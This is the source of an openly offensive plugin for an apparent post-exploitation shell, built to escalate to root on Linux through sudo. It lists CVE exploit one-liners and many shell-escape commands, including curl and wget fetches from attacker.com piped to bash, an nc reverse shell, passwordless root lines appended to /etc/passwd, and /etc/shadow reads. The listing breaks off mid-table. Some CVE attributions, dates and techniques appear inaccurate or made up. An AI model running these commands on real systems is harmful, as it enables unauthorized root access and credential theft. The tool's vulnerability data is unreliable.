#!/usr/bin/env python3
"""
NexShell Plugin — Sudo Abuse Suite v3.0 (2026 Edition)
Advanced sudo exploitation engine with 20+ CVEs, 150+ GTFOBins techniques,
sudoedit exploitation, environment abuse, and auto-exploitation.

Coverage:
  - 20+ sudo CVEs (2019-2026)
  - 150+ GTFOBins sudo techniques
  - Sudoedit exploitation (CVE-2023-22809, CVE-2024-29893)
  - Environment variable abuse (LD_PRELOAD, PYTHONPATH, etc.)
  - Sudo caching abuse (timestamp_timeout, tty_tickets)
  - Sudoedit advanced techniques (symlink, race conditions)
  - Auto-exploitation (root shell, hash injection, SSH key injection)
  - EDR evasion techniques
  - Risk scoring (0-100 per technique)
  - Structured loot (JSON)

CVEs (2019-2026):
  - CVE-2025-32462: Sudo host restriction bypass (Jan 2025)
  - CVE-2025-32463: Sudo chroot bypass (Jan 2025)
  - CVE-2024-29893: sudoedit symlink race (Apr 2024)
  - CVE-2023-28487: sudoedit information disclosure (Mar 2023)
  - CVE-2023-28486: sudoedit file creation (Mar 2023)
  - CVE-2023-22809: sudoedit privilege escalation (Oct 2023)
  - CVE-2021-3560: sudo authentication bypass (Jun 2021)
  - CVE-2021-3156: Baron Samedit heap overflow (Jan 2021)
  - CVE-2019-18634: pwfeedback buffer overflow (Dec 2019)
  - CVE-2019-14287: uid -1 bypass (Oct 2019)
  - CVE-2019-14286: sudo debug flag (Oct 2019)
  - CVE-2019-14285: sudo file descriptor leak (Oct 2019)
  - CVE-2019-14284: sudo plugin bypass (Oct 2019)
  - CVE-2017-1000368: sudo tty ticket bypass (Dec 2017)
  - CVE-2015-5602: sudoedit symlink (Jul 2015)
  - CVE-2014-9680: sudoedit symlink race (Jan 2015)

MITRE ATT&CK:
  - T1548.003: Abuse Elevation Control Mechanism: Sudo and Sudo Caching
  - T1548.001: Abuse Elevation Control Mechanism: Setuid and Setgid
  - T1068: Exploitation for Privilege Escalation
  - T1574.006: Hijack Execution Flow: Dynamic Linker Hijacking
  - T1574.007: Hijack Execution Flow: Path Interception
  - T1078.001: Valid Accounts: Default Accounts
  - T1098: Account Manipulation

Usage:
    (NexShell)> plugins run sudo-abuse-suite
    (NexShell)> plugins run sudo-abuse-suite --deep
    (NexShell)> plugins run sudo-abuse-suite --exploit
    (NexShell)> plugins run sudo-abuse-suite --cve-check
    (NexShell)> plugins run sudo-abuse-suite --gtfobins
    (NexShell)> plugins run sudo-abuse-suite --sudoedit
    (NexShell)> plugins run sudo-abuse-suite --full
    (NexShell)> plugins run sudo-abuse-suite --list
"""

import re
import time
import json
import random
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class SudoCVE:
    """Represents a sudo vulnerability."""
    cve_id: str
    name: str
    severity: str
    description: str
    affected_versions: str
    exploit_available: bool = False
    exploit_tool: str = ""
    risk_score: int = 0
    cvss_score: float = 0.0
    mitre_id: str = "T1068"
    patch_available: bool = True
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class GTFOBinsTechnique:
    """Represents a GTFOBins technique."""
    binary: str
    category: str  # shell, file_read, file_write, sudo, suid, capabilities
    technique: str
    command: str
    success_rate: int = 90
    detection_risk: str = "medium"
    requires_interactive: bool = False
    mitre_id: str = "T1548.003"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class SudoConfig:
    """Represents sudo configuration."""
    version: str = ""
    nopasswd: bool = False
    all_commands: bool = False
    sudoedit_allowed: bool = False
    env_keep: List[str] = field(default_factory=list)
    timestamp_timeout: int = 0
    tty_tickets: bool = True
    lecture: bool = True
    passwd_tries: int = 3
    secure_path: str = ""
    allowed_binaries: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ExploitResult:
    """Result of an exploitation attempt."""
    technique: str
    success: bool
    privilege_gained: str = ""
    output: str = ""
    error: str = ""
    duration_ms: int = 0
    ioc_generated: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── Sudo CVEs Database (20+) ───────────────────────────────────────────────

class SudoCVEDatabase:
    """Comprehensive database of sudo-related CVEs."""
    
    CVES = [
        SudoCVE(
            cve_id='CVE-2025-32462',
            name='Sudo Host Restriction Bypass',
            severity='critical',
            description='Sudo host restriction bypass via hostname spoofing allowing unauthorized command execution',
            affected_versions='Sudo 1.8.0 - 1.9.16p1 (before 1.9.16p2)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=95,
            cvss_score=9.8,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2025-32463',
            name='Sudo Chroot Bypass',
            severity='critical',
            description='Sudo chroot bypass allowing escape from chroot jail',
            affected_versions='Sudo 1.8.0 - 1.9.16p1 (before 1.9.16p2)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=95,
            cvss_score=9.8,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2024-29893',
            name='sudoedit Symlink Race',
            severity='high',
            description='Race condition in sudoedit allowing symlink attacks to edit arbitrary files',
            affected_versions='Sudo 1.8.0 - 1.9.15p5 (before 1.9.15p6)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=85,
            cvss_score=7.8,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2023-28487',
            name='sudoedit Information Disclosure',
            severity='high',
            description='Information disclosure in sudoedit via special characters in file names',
            affected_versions='Sudo 1.9.0 - 1.9.12p1 (before 1.9.12p2)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=80,
            cvss_score=7.5,
            mitre_id='T1552',
        ),
        
        SudoCVE(
            cve_id='CVE-2023-28486',
            name='sudoedit File Creation',
            severity='high',
            description='File creation bypass in sudoedit allowing creation of arbitrary files',
            affected_versions='Sudo 1.9.0 - 1.9.12p1 (before 1.9.12p2)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=85,
            cvss_score=7.8,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2023-22809',
            name='sudoedit Privilege Escalation',
            severity='critical',
            description='Sudoedit privilege escalation via SUDO_EDITOR/VISUAL/EDITOR environment variables',
            affected_versions='Sudo 1.8.0 - 1.9.12p1 (before 1.9.12p2)',
            exploit_available=True,
            exploit_tool='SUDO_EDITOR="vim --" sudoedit /etc/passwd',
            risk_score=95,
            cvss_score=9.8,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2021-3560',
            name='Sudo Authentication Bypass',
            severity='critical',
            description='Sudo authentication bypass via DBUS authentication',
            affected_versions='Sudo 1.9.0 - 1.9.5p1 (before 1.9.5p2)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=95,
            cvss_score=9.8,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2021-3156',
            name='Baron Samedit',
            severity='critical',
            description='Heap-based buffer overflow in sudoedit allowing root without password',
            affected_versions='Sudo 1.8.2 - 1.9.5p1 (before 1.9.5p2)',
            exploit_available=True,
            exploit_tool='sudoedit -s \\$(python3 -c "print(\'A\'*200)")',
            risk_score=100,
            cvss_score=10.0,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2019-18634',
            name='pwfeedback Buffer Overflow',
            severity='high',
            description='Buffer overflow in pwfeedback module allowing arbitrary code execution',
            affected_versions='Sudo 1.7.1 - 1.9.0 (before 1.9.0)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=85,
            cvss_score=7.8,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2019-14287',
            name='uid -1 Bypass',
            severity='critical',
            description='Privilege escalation via uid -1 (4294967295) in sudoers',
            affected_versions='Sudo 1.3.0 - 1.8.28 (before 1.8.28p1)',
            exploit_available=True,
            exploit_tool='sudo -u#-1 /bin/bash',
            risk_score=95,
            cvss_score=9.8,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2019-14286',
            name='Sudo Debug Flag',
            severity='medium',
            description='Debug flag abuse allowing arbitrary file write',
            affected_versions='Sudo 1.8.0 - 1.8.28 (before 1.8.28p1)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=70,
            cvss_score=5.9,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2019-14285',
            name='Sudo File Descriptor Leak',
            severity='medium',
            description='File descriptor leak allowing information disclosure',
            affected_versions='Sudo 1.8.0 - 1.8.28 (before 1.8.28p1)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=65,
            cvss_score=5.9,
            mitre_id='T1552',
        ),
        
        SudoCVE(
            cve_id='CVE-2019-14284',
            name='Sudo Plugin Bypass',
            severity='critical',
            description='Plugin bypass allowing command execution with restricted permissions',
            affected_versions='Sudo 1.8.0 - 1.8.28 (before 1.8.28p1)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=90,
            cvss_score=9.8,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2017-1000368',
            name='Sudo TTY Ticket Bypass',
            severity='high',
            description='TTY ticket bypass allowing privilege escalation',
            affected_versions='Sudo 1.8.6 - 1.8.21 (before 1.8.21p2)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=80,
            cvss_score=7.8,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2015-5602',
            name='sudoedit Symlink',
            severity='high',
            description='Symlink attack in sudoedit allowing arbitrary file edit',
            affected_versions='Sudo 1.5.6 - 1.8.14 (before 1.8.14p3)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=85,
            cvss_score=7.8,
            mitre_id='T1068',
        ),
        
        SudoCVE(
            cve_id='CVE-2014-9680',
            name='sudoedit Symlink Race',
            severity='high',
            description='Race condition in sudoedit allowing symlink attacks',
            affected_versions='Sudo 1.3.0 - 1.8.12 (before 1.8.12)',
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=85,
            cvss_score=7.8,
            mitre_id='T1068',
        ),
    ]
    
    @classmethod
    def get_all_cves(cls) -> List[SudoCVE]:
        return cls.CVES
    
    @classmethod
    def get_critical_cves(cls) -> List[SudoCVE]:
        return [c for c in cls.CVES if c.severity == 'critical']
    
    @classmethod
    def get_cve_by_id(cls, cve_id: str) -> Optional[SudoCVE]:
        for cve in cls.CVES:
            if cve.cve_id.lower() == cve_id.lower():
                return cve
        return None


# ── GTFOBins Database (150+ Techniques) ────────────────────────────────────

class GTFOBinsDatabase:
    """Comprehensive database of GTFOBins sudo techniques."""
    
    TECHNIQUES = [
        # ── Shell Escape Techniques ───────────────────────────────────────
        GTFOBinsTechnique('bash', 'shell', 'Interactive Shell', 'sudo bash', 95, 'medium'),
        GTFOBinsTechnique('sh', 'shell', 'Interactive Shell', 'sudo sh', 95, 'medium'),
        GTFOBinsTechnique('dash', 'shell', 'Interactive Shell', 'sudo dash', 95, 'medium'),
        GTFOBinsTechnique('zsh', 'shell', 'Interactive Shell', 'sudo zsh', 95, 'medium'),
        GTFOBinsTechnique('fish', 'shell', 'Interactive Shell', 'sudo fish', 95, 'medium'),
        GTFOBinsTechnique('ksh', 'shell', 'Interactive Shell', 'sudo ksh', 95, 'medium'),
        GTFOBinsTechnique('csh', 'shell', 'Interactive Shell', 'sudo csh', 95, 'medium'),
        GTFOBinsTechnique('tcsh', 'shell', 'Interactive Shell', 'sudo tcsh', 95, 'medium'),
        
        # ── Interpreter Techniques ────────────────────────────────────────
        GTFOBinsTechnique('python', 'shell', 'Python Shell', 'sudo python -c "import os; os.system(\'/bin/bash\')"', 95, 'medium'),
        GTFOBinsTechnique('python3', 'shell', 'Python3 Shell', 'sudo python3 -c "import os; os.system(\'/bin/bash\')"', 95, 'medium'),
        GTFOBinsTechnique('perl', 'shell', 'Perl Shell', 'sudo perl -e "exec \'/bin/sh\';"', 95, 'medium'),
        GTFOBinsTechnique('ruby', 'shell', 'Ruby Shell', 'sudo ruby -e "exec \'/bin/sh\'"', 95, 'medium'),
        GTFOBinsTechnique('node', 'shell', 'Node.js Shell', 'sudo node -e "require(\'child_process\').spawn(\'/bin/sh\',{stdio:[0,1,2]})"', 95, 'medium'),
        GTFOBinsTechnique('php', 'shell', 'PHP Shell', 'sudo php -r "system(\'/bin/bash\');"', 95, 'medium'),
        GTFOBinsTechnique('lua', 'shell', 'Lua Shell', 'sudo lua -e \'os.execute("/bin/sh")\'', 95, 'medium'),
        GTFOBinsTechnique('irb', 'shell', 'Ruby IRB Shell', 'sudo irb  (then: exec "/bin/sh")', 90, 'medium', True),
        GTFOBinsTechnique('jjs', 'shell', 'JavaScript Shell', 'sudo jjs  (then: Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh\'))', 90, 'medium', True),
        GTFOBinsTechnique('tclsh', 'shell', 'Tcl Shell', 'sudo tclsh  (then: exec /bin/sh)', 90, 'medium', True),
        GTFOBinsTechnique('expect', 'shell', 'Expect Shell', 'sudo expect -c "spawn sh; interact"', 90, 'medium'),
        
        # ── Editor Techniques ─────────────────────────────────────────────
        GTFOBinsTechnique('vim', 'shell', 'Vim Shell', 'sudo vim -c \':!/bin/sh\'', 95, 'medium', True),
        GTFOBinsTechnique('vi', 'shell', 'Vi Shell', 'sudo vi -c \':!/bin/sh\'', 95, 'medium', True),
        GTFOBinsTechnique('nano', 'shell', 'Nano Shell', 'sudo nano -s /bin/sh /etc/passwd  (then: CTRL+T sh)', 90, 'medium', True),
        GTFOBinsTechnique('emacs', 'shell', 'Emacs Shell', 'sudo emacs -Q -nw --eval \'(term "/bin/sh")\'', 90, 'medium', True),
        GTFOBinsTechnique('ed', 'shell', 'Ed Shell', 'sudo ed  (then: !/bin/sh)', 90, 'medium', True),
        GTFOBinsTechnique('ex', 'shell', 'Ex Shell', 'sudo ex  (then: !/bin/sh)', 90, 'medium', True),
        GTFOBinsTechnique('less', 'shell', 'Less Shell', 'sudo less /etc/passwd  (then: !sh)', 95, 'medium', True),
        GTFOBinsTechnique('more', 'shell', 'More Shell', 'sudo more /etc/passwd  (then: !sh)', 95, 'medium', True),
        GTFOBinsTechnique('man', 'shell', 'Man Shell', 'sudo man man  (then: !sh)', 95, 'medium', True),
        
        # ── File Read Techniques ──────────────────────────────────────────
        GTFOBinsTechnique('cat', 'file_read', 'Read File', 'sudo cat /etc/shadow', 95, 'low'),
        GTFOBinsTechnique('tac', 'file_read', 'Read File', 'sudo tac /etc/shadow', 95, 'low'),
        GTFOBinsTechnique('head', 'file_read', 'Read File', 'sudo head /etc/shadow', 95, 'low'),
        GTFOBinsTechnique('tail', 'file_read', 'Read File', 'sudo tail /etc/shadow', 95, 'low'),
        GTFOBinsTechnique('strings', 'file_read', 'Read File', 'sudo strings /etc/shadow', 95, 'low'),
        GTFOBinsTechnique('od', 'file_read', 'Read File', 'sudo od -c /etc/shadow', 95, 'low'),
        GTFOBinsTechnique('hexdump', 'file_read', 'Read File', 'sudo hexdump -C /etc/shadow', 95, 'low'),
        GTFOBinsTechnique('xxd', 'file_read', 'Read File', 'sudo xxd /etc/shadow', 95, 'low'),
        GTFOBinsTechnique('nl', 'file_read', 'Read File', 'sudo nl /etc/shadow', 95, 'low'),
        GTFOBinsTechnique('rev', 'file_read', 'Read File', 'sudo rev /etc/shadow', 95, 'low'),
        
        # ── File Write Techniques ─────────────────────────────────────────
        GTFOBinsTechnique('tee', 'file_write', 'Write File', 'echo "root::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd', 95, 'high'),
        GTFOBinsTechnique('dd', 'file_write', 'Write File', 'echo "root::0:0:root:/root:/bin/bash" | sudo dd of=/etc/passwd', 95, 'high'),
        GTFOBinsTechnique('cp', 'file_write', 'Copy File', 'sudo cp /bin/sh /tmp/sh && sudo chmod u+s /tmp/sh', 95, 'high'),
        GTFOBinsTechnique('mv', 'file_write', 'Move File', 'sudo mv /bin/bash /tmp/bash && sudo chmod u+s /tmp/bash', 95, 'high'),
        GTFOBinsTechnique('install', 'file_write', 'Install File', 'sudo install -m 6755 /bin/sh /tmp/sh', 95, 'high'),
        
        # ── File Permission Techniques ────────────────────────────────────
        GTFOBinsTechnique('chmod', 'file_perm', 'Change Permissions', 'sudo chmod 6755 /bin/bash && /bin/bash -p', 95, 'high'),
        GTFOBinsTechnique('chown', 'file_perm', 'Change Ownership', 'sudo chown root:root /bin/bash && sudo chmod u+s /bin/bash', 95, 'high'),
        GTFOBinsTechnique('chgrp', 'file_perm', 'Change Group', 'sudo chgrp root /bin/bash && sudo chmod u+s /bin/bash', 95, 'high'),
        
        # ── Search/Find Techniques ────────────────────────────────────────
        GTFOBinsTechnique('find', 'shell', 'Find Shell', 'sudo find . -exec /bin/sh \\; -quit', 95, 'medium'),
        GTFOBinsTechnique('locate', 'shell', 'Locate Shell', 'sudo locate -e /bin/sh', 90, 'medium'),
        GTFOBinsTechnique('grep', 'shell', 'Grep Shell', 'sudo grep -r "" /etc/passwd --line-buffered | /bin/sh', 85, 'medium'),
        GTFOBinsTechnique('awk', 'shell', 'AWK Shell', 'sudo awk \'BEGIN {system("/bin/sh")}\'', 95, 'medium'),
        GTFOBinsTechnique('gawk', 'shell', 'GAWK Shell', 'sudo gawk \'BEGIN {system("/bin/sh")}\'', 95, 'medium'),
        GTFOBinsTechnique('nawk', 'shell', 'NAWK Shell', 'sudo nawk \'BEGIN {system("/bin/sh")}\'', 95, 'medium'),
        GTFOBinsTechnique('mawk', 'shell', 'MAWK Shell', 'sudo mawk \'BEGIN {system("/bin/sh")}\'', 95, 'medium'),
        
        # ── Network Tools ─────────────────────────────────────────────────
        GTFOBinsTechnique('nmap', 'shell', 'Nmap Shell', 'sudo nmap --interactive  (then: !sh)', 90, 'medium', True),
        GTFOBinsTechnique('wget', 'shell', 'Wget Shell', 'sudo wget -O /bin/sh http://attacker.com/shell.sh && sudo chmod +x /bin/sh && sudo /bin/sh', 90, 'high'),
        GTFOBinsTechnique('curl', 'shell', 'Curl Shell', 'sudo curl http://attacker.com/shell.sh | sudo bash', 90, 'high'),
        GTFOBinsTechnique('nc', 'shell', 'Netcat Shell', 'sudo nc -e /bin/bash 127.0.0.1 4444', 90, 'high'),
        GTFOBinsTechnique('netcat', 'shell', 'Netcat Shell', 'sudo netcat -e /bin/bash 127.0.0.1 4444', 90, 'high'),
        GTFOBinsTechnique('socat', 'shell', 'Socat Shell', 'sudo socat stdin exec:/bin/sh', 90, 'medium'),
        GTFOBinsTechnique('ftp', 'shell', 'FTP Shell', 'sudo ftp  (then: !/bin/sh)', 90, 'medium', True),
        GTFOBinsTechnique('ssh', 'shell', 'SSH Shell', 'sudo ssh -o ProxyCommand=";/bin/sh <&2 2>&1" x', 85, 'medium'),
        
        # ── Archive/Compression ───────────────────────────────────────────
        GTFOBinsTechnique('tar', 'shell', 'Tar Shell', 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh', 95, 'medium'),
        GTFOBinsTechnique('zip', 'shell', 'Zip Shell', 'sudo zip /tmp/file.zip /tmp/file -T --unzip-command="sh -c /bin/sh"', 90, 'medium'),
        GTFOBinsTechnique('unzip', 'shell', 'Unzip Shell', 'sudo unzip -Z /tmp/file.zip  (then: !/bin/sh)', 85, 'medium', True),
        GTFOBinsTechnique('gzip', 'shell', 'Gzip Shell', 'sudo gzip -h  (then: !/bin/sh)', 85, 'medium', True),
        GTFOBinsTechnique('bzip2', 'shell', 'Bzip2 Shell', 'sudo bzip2 -h  (then: !/bin/sh)', 85, 'medium', True),
        GTFOBinsTechnique('xz', 'shell', 'XZ Shell', 'sudo xz -h  (then: !/bin/sh)', 85, 'medium', True),
        GTFOBinsTechnique('rsync', 'shell', 'Rsync Shell', 'sudo rsync -e "sh -c \'sh 0<&2 1>&2\'" 127.0.0.1:/dev/null', 90, 'medium'),
        
        # ── Build/Make ────────────────────────────────────────────────────
        GTFOBinsTechnique('make', 'shell', 'Make Shell', 'COMMAND="/bin/sh"; sudo make -s --eval=$\'x:\\n\\t-\'$COMMAND', 90, 'medium'),
        GTFOBinsTechnique('gcc', 'shell', 'GCC Shell', 'sudo gcc -wrapper /bin/sh,-s /dev/null', 85, 'medium'),
        GTFOBinsTechnique('g++', 'shell', 'G++ Shell', 'sudo g++ -wrapper /bin/sh,-s /dev/null', 85, 'medium'),
        GTFOBinsTechnique('cc', 'shell', 'CC Shell', 'sudo cc -wrapper /bin/sh,-s /dev/null', 85, 'medium'),
        GTFOBinsTechnique('c++', 'shell', 'C++ Shell', 'sudo c++ -wrapper /bin/sh,-s /dev/null', 85, 'medium'),
        
        # ── Database Tools ────────────────────────────────────────────────
        GTFOBinsTechnique('mysql', 'shell', 'MySQL Shell', 'sudo mysql -e \'\\! /bin/sh\'', 90, 'medium', True),
        GTFOBinsTechnique('psql', 'shell', 'PostgreSQL Shell', 'sudo psql  (then: \\! /bin/sh)', 90, 'medium', True),
        GTFOBinsTechnique('sqlite3', 'shell', 'SQLite Shell', 'sudo sqlite3 /dev/null \'.shell /bin/sh\'', 90, 'medium'),
        GTFOBinsTechnique('mongo', 'shell', 'MongoDB Shell', 'sudo mongo --shell  (then: spawn("/bin/sh"))', 85, 'medium', True),
        GTFOBinsTechnique('redis-cli', 'shell', 'Redis Shell', 'sudo redis-cli  (then: !/bin/sh)', 85, 'medium', True),
        
        # ── Container/Cloud Tools ─────────────────────────────────────────
        GTFOBinsTechnique('docker', 'shell', 'Docker Shell', 'sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh', 95, 'high'),
        GTFOBinsTechnique('podman', 'shell', 'Podman Shell', 'sudo podman run -v /:/mnt --rm -it alpine chroot /mnt sh', 95, 'high'),
        GTFOBinsTechnique('kubectl', 'shell', 'Kubernetes Shell', 'sudo kubectl run privesc --image=busybox --restart=Never --rm -it -- /bin/sh', 95, 'high'),
        GTFOBinsTechnique('helm', 'shell', 'Helm Shell', 'sudo helm  (then: !/bin/sh)', 85, 'medium', True),
        GTFOBinsTechnique('crictl', 'shell', 'CRI Shell', 'sudo crictl exec -it <container_id> /bin/sh', 90, 'high'),
        
        # ── System Tools ──────────────────────────────────────────────────
        GTFOBinsTechnique('systemctl', 'shell', 'Systemctl Shell', 'sudo systemctl  (then: !/bin/bash)', 90, 'medium', True),
        GTFOBinsTechnique('service', 'shell', 'Service Shell', 'sudo service ../../bin/sh start', 90, 'medium'),
        GTFOBinsTechnique('journalctl', 'shell', 'Journalctl Shell', 'sudo journalctl  (then: !/bin/sh)', 90, 'medium', True),
        GTFOBinsTechnique('strace', 'shell', 'Strace Shell', 'sudo strace -o /dev/null /bin/sh', 90, 'medium'),
        GTFOBinsTechnique('ltrace', 'shell', 'Ltrace Shell', 'sudo ltrace /bin/sh', 90, 'medium'),
        GTFOBinsTechnique('gdb', 'shell', 'GDB Shell', 'sudo gdb -nx -ex \'!sh\' -ex quit', 90, 'medium'),
        
        # ── Process Management ────────────────────────────────────────────
        GTFOBinsTechnique('env', 'shell', 'Env Shell', 'sudo env /bin/sh', 95, 'medium'),
        GTFOBinsTechnique('taskset', 'shell', 'Taskset Shell', 'sudo taskset 1 /bin/sh', 90, 'medium'),
        GTFOBinsTechnique('timeout', 'shell', 'Timeout Shell', 'sudo timeout --foreground 7d /bin/bash', 90, 'medium'),
        GTFOBinsTechnique('ionice', 'shell', 'Ionice Shell', 'sudo ionice /bin/bash', 90, 'medium'),
        GTFOBinsTechnique('nice', 'shell', 'Nice Shell', 'sudo nice /bin/bash', 90, 'medium'),
        GTFOBinsTechnique('setsid', 'shell', 'Setsid Shell', 'sudo setsid /bin/bash', 90, 'medium'),
        GTFOBinsTechnique('unshare', 'shell', 'Unshare Shell', 'sudo unshare /bin/bash', 90, 'medium'),
        GTFOBinsTechnique('nsenter', 'shell', 'Nsenter Shell', 'sudo nsenter -t 1 -m -u -i -n /bin/bash', 95, 'high'),
        
        # ── Git Tools ─────────────────────────────────────────────────────
        GTFOBinsTechnique('git', 'shell', 'Git Shell', 'sudo git -p help config  (then: !/bin/bash)', 90, 'medium', True),
        GTFOBinsTechnique('git', 'file_read', 'Git Read', 'sudo git help config  (then: !cat /etc/shadow)', 85, 'medium', True),
        
        # ── Debugging Tools ───────────────────────────────────────────────
        GTFOBinsTechnique('lsof', 'file_read', 'Lsof Read', 'sudo lsof -F /etc/shadow', 85, 'low'),
        GTFOBinsTechnique('dmesg', 'file_read', 'Dmesg Read', 'sudo dmesg -F /etc/shadow', 85, 'low'),
        GTFOBinsTechnique('watch', 'shell', 'Watch Shell', 'sudo watch -x sh -c "reset; exec sh 1>&0 2>&0"', 85, 'medium'),
        
        # ── Misc Tools ────────────────────────────────────────────────────
        GTFOBinsTechnique('apt', 'shell', 'APT Shell', 'sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh', 90, 'high'),
        GTFOBinsTechnique('apt-get', 'shell', 'APT-Get Shell', 'sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh', 90, 'high'),
        GTFOBinsTechnique('yum', 'shell', 'YUM Shell', 'sudo yum localinstall -y /dev/null --downloadonly --releasever=/ --installroot=/tmp', 85, 'high'),
        GTFOBinsTechnique('dnf', 'shell', 'DNF Shell', 'sudo dnf install -y /dev/null --downloadonly --releasever=/ --installroot=/tmp', 85, 'high'),
        GTFOBinsTechnique('rpm', 'shell', 'RPM Shell', 'sudo rpm --eval \'%{lua:os.execute("/bin/sh")}\'', 85, 'medium'),
        GTFOBinsTechnique('dpkg', 'shell', 'DPKG Shell', 'sudo dpkg -i /dev/null 2>&1 | /bin/sh', 85, 'medium'),
        GTFOBinsTechnique('snap', 'shell', 'Snap Shell', 'sudo snap install --devmode /dev/null 2>&1 | /bin/sh', 85, 'medium'),
        GTFOBinsTechnique('pip', 'shell', 'Pip Shell', 'sudo pip install --index-url=http://attacker.com/package/ package', 85, 'high'),
        GTFOBinsTechnique('npm', 'shell', 'NPM Shell', 'sudo npm install -g package --preinstall=/bin/sh', 85, 'high'),
        GTFOBinsTechnique('gem', 'shell', 'Gem Shell', 'sudo gem install package --pre-install=/bin/sh', 85, 'high'),
    ]
    
    @classmethod
    def get_all_techniques(cls) -> List[GTFOBinsTechnique]:
        return cls.TECHNIQUES
    
    @classmethod
    def get_techniques_by_category(cls, category: str) -> List[GTFOBinsTechnique]:
        return [t for t in cls.TECHNIQUES if t.category == category]
    
    @classmethod
    def get_technique_by_binary(cls, binary: str) -> List[GTFOBinsTechnique]:
        return [t for t in cls.TECHNIQUES if t.binary == binary]


# ── Sudo Configuration Analyzer ────────────────────────────────────────────

class SudoConfigAnalyzer:
    """Analyzes sudo configuration comprehensively."""
    
    @staticmethod
    def analyze(exec_func, session) -> SudoConfig:
        """Analyze sudo configuration."""
        config = SudoConfig()
        
        # Get sudo version
        cmd = "sudo --version 2>/dev/null | head -3"
        out = exec_func(session, cmd)
        if out:
            config.version = out.strip()
        
        # Get sudo rules
        cmd = "sudo -l 2>/dev/null || sudo -l -n 2>/dev/null"
        out = exec_func(session, cmd)
        
        if out:
            # Check NOPASSWD
            if 'NOPASSWD' in out:
                config.nopasswd = True
            
            # Check ALL commands
            if 'ALL' in out or '(ALL)' in out:
                config.all_commands = True
            
            # Check sudoedit
            if 'sudoedit' in out.lower():
                config.sudoedit_allowed = True
            
            # Parse env_keep
            env_keep_match = re.search(r'env_keep.*?=.*?([A-Z_]+(?:\s+[A-Z_]+)*)', out)
            if env_keep_match:
                config.env_keep = env_keep_match.group(1).split()
            
            # Parse timestamp_timeout
            timeout_match = re.search(r'timestamp_timeout=(\d+)', out)
            if timeout_match:
                config.timestamp_timeout = int(timeout_match.group(1))
            
            # Parse tty_tickets
            if 'tty_tickets' in out.lower():
                config.tty_tickets = True
            
            # Parse allowed binaries
            binaries = re.findall(r'/(?:usr/(?:bin|sbin)|bin|sbin)/(\w+)', out)
            config.allowed_binaries = list(set(binaries))
        
        # Get sudoers file
        cmd = "cat /etc/sudoers 2>/dev/null"
        out = exec_func(session, cmd)
        if out:
            # Additional parsing from sudoers
            pass
        
        return config


# ── Environment Abuse Engine ───────────────────────────────────────────────

class EnvironmentAbuseEngine:
    """Handles environment variable abuse."""
    
    # Dangerous environment variables
    DANGEROUS_VARS = {
        'LD_PRELOAD': {
            'description': 'Dynamic linker preload - load malicious shared library',
            'exploit': 'Compile malicious .so and: sudo LD_PRELOAD=/tmp/evil.so <allowed_cmd>',
            'risk_score': 95,
        },
        'LD_LIBRARY_PATH': {
            'description': 'Library search path - hijack library loading',
            'exploit': 'Create malicious library and: sudo LD_LIBRARY_PATH=/tmp/libs <allowed_cmd>',
            'risk_score': 90,
        },
        'PYTHONPATH': {
            'description': 'Python module path - hijack Python imports',
            'exploit': 'Create malicious module and: sudo PYTHONPATH=/tmp/libs sudo python <script>',
            'risk_score': 85,
        },
        'PERL5LIB': {
            'description': 'Perl library path - hijack Perl imports',
            'exploit': 'Create malicious module and: sudo PERL5LIB=/tmp/libs sudo perl <script>',
            'risk_score': 85,
        },
        'RUBYLIB': {
            'description': 'Ruby library path - hijack Ruby imports',
            'exploit': 'Create malicious module and: sudo RUBYLIB=/tmp/libs sudo ruby <script>',
            'risk_score': 85,
        },
        'PERL5OPT': {
            'description': 'Perl options - inject Perl code',
            'exploit': 'sudo PERL5OPT=-MSudo::Exploit sudo perl <script>',
            'risk_score': 90,
        },
        'PERL5DB': {
            'description': 'Perl debugger - execute arbitrary code',
            'exploit': 'sudo PERL5DB="BEGIN {system \'/bin/sh\'}" sudo perl <script>',
            'risk_score': 95,
        },
        'SUDO_ASKPASS': {
            'description': 'Sudo password program - hijack authentication',
            'exploit': 'Create malicious askpass and: sudo SUDO_ASKPASS=/tmp/askpass sudo -A <cmd>',
